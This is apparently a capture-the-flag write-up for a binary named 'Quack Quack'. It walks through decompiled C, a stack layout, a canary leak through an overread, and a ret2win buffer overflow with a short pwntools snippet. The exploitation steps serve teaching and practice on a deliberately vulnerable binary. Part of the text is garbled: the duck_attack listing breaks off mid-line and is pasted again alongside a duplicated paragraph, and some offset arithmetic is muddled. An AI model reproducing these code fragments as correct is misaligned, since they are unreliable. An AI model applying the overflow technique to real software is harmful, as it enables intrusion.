# Enumeration

First of all, we start with a `checksec`:  

![Screenshot from 2025-03-27 00-38-37](https://github.com/user-attachments/assets/3920eca5-f740-4ad0-ad07-975e511cdbbb)



### Disassembly

Starting with `main()`:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  duckling(argc, argv, envp);
  return 0;
}

```

As we can see, `main` only calls `duckling()`. Taking a look there.

```c
unsigned __int64 duckling()
{
  char *v1; // [rsp+8h] [rbp-88h]
  _QWORD buf[4]; // [rsp+10h] [rbp-80h] BYREF
  _QWORD v3[11]; // [rsp+30h] [rbp-60h] BYREF
  unsigned __int64 v4; // [rsp+88h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  memset(buf, 0, sizeof(buf));
  memset(v3, 0, 80);
  printf("Quack the Duck!\n\n> ");
  fflush(_bss_start);
  read(0, buf, 0x66uLL);
  v1 = strstr((const char *)buf, "Quack Quack ");
  if ( !v1 )
  {
    error("Where are your Quack Manners?!\n");
    exit(1312);
  }
  printf("Quack Quack %s, ready to fight the Duck?\n\n> ", v1 + 32);
  read(0, v3, 0x6AuLL);
  puts("Did you really expect to win a fight against a Duck?!\n");
  return v4 - __readfsqword(0x28u);
}
```

As we can see, there are 2 buffers, `buf[4]` and `v3[11]` of unknown size so far. The juice of the challenge is these 2 lines:

```c
  read(0, buf, 0x66uLL);
  v1 = strstr((const char *)buf, "Quack Quack ");
  printf("Quack Quack %s, ready to fight the Duck?\n\n> ", v1 + 32);
```

Our first input goes to `buf` and we get a leak of `v1 + 32`. That means we can leak up to `32` from the end of the buffer 
where the string `Quack Quack ` is found in our input string. Luckily, we see that we can leak the `canary` address at such offset when debug.
After that, we can overflow the second buffer and perform a `ret2win`. There is a function called `duck_attack` that prints the flag.

```c
unsigned __int64 duck_attack()
{
  char buf; // [rsp+3h] [rbp-Dh] BYREF
  int fd; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  fd = open("./flag.txt", 0);
  if ( fd < 0 )
  {
    perror("\nError opening flag.txt, please contact an Administrator\n");
    exit(1);
  }
  while ( read(fd, &buf, 1uLL) > 0 )
    fputc(buf, _bss_start);
  close(fd);.
After that, we can overflow the second buffer and perform a `ret2win`. There is a function called `duck_attack` that prints the flag.

```c
unsigned __int64 duck_attack()
{
  char buf; // [rsp+3h] [rbp-Dh] BYREF
  return v3 - __readfsqword(0x28u);
}
```

### Debugging 
I used IDA pro, so it automatically debug and find the address of variables for me. You can see that on the comments of the disassembled code.

Now, to prove all this theory we can check the debugging. 
```
Địa chỉ cao    +----------------+
               | Địa chỉ trở về |
        rbp -> +----------------+
               |Canary[rbp-0x8] |  <-- v4
               +----------------+
               |                |
               |     .....      |  (các biến khác, padding)
               |                |
               +----------------+
               |                |
               |   buf[rbp-0x80]    |  <-- buf[4] bắt đầu từ [rbp-0x80]
               |                |
               +----------------+
               |                |
        rsp -> +----------------+
Địa chỉ thấp
```
![image](https://github.com/user-attachments/assets/543c1298-bbd7-4150-92b8-1616e78584cb)

So the distance between Canary and buf is `0x80-0x8 = 0x78` bytes. But, to override the Canary, we need one more byte so need to pass 121 bytes to get Canary leak.
And then `\x00` is overrided which is the last byte of canary.
```c
  v1 = strstr((const char *)buf, "Quack Quack ");
  printf("Quack Quack %s, ready to fight the Duck?\n\n> ", v1 + 32);
```
Thus, `v1+32=121` and  v1 is the first letter that is found from input. 
So we need to send:
`89*'A' + "Quack Quack "(12 bytes) = total 101 bytes = 0x65`
```python
r.sendlineafter('> ', b'A'* (0x65 - len('Quack Quack ')) + b'Quack Quack ')

r.recvuntil('Quack Quack ')

canary = u64(r.recv(7).rjust(8, b'\x00'))
```

After have Canary value, we calculate the distance between the second input and the canary as the previous one.
`0x60-0x8= 88 bytes`. This time we dont need to plus 1 byte because we have the canary value.
So the payload is:
`88*'A' + Canary + 8 bytes (save rbp) + return address(duck_attack)`.
In my code, i write `canary*2`. because one for canary, one for override the 8 bytes save rbp.

# Result
![image](https://github.com/user-attachments/assets/60d16b42-810e-4b92-acc2-8eedfdfa18f2)


